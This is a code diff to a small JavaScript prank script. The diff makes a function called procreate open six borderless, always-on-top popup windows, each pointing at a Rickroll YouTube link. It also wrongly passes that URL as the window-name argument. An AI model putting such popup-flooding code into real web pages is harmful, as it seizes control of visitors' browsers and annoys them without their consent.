@@ -1,22 +1,20 @@
-
-
-		var xOff = 5;
+	var xOff = 5;
 		var yOff = 5;
 		var xPos = 400;
 		var yPos = -100;
 		var flagRun = 1;
 
 function openWindow(url){
-        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
+        aWindow = window.open(url,"https://www.youtube.com/watch?v=dQw4w9WgXcQ", 'menubar=no,status=no,toolbar=noresizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
 }
 
 function procreate(){
-		openWindow('open.html');
-		openWindow('open.html');
-		openWindow('open.html');
-		openWindow('open.html');
-		openWindow('open.html');
-		openWindow('open.html');
+		openWindow('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
+		openWindow('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
+		openWindow('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
+		openWindow('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
+		openWindow('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
+		openWindow('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
 		}
 
 function newXlt(){
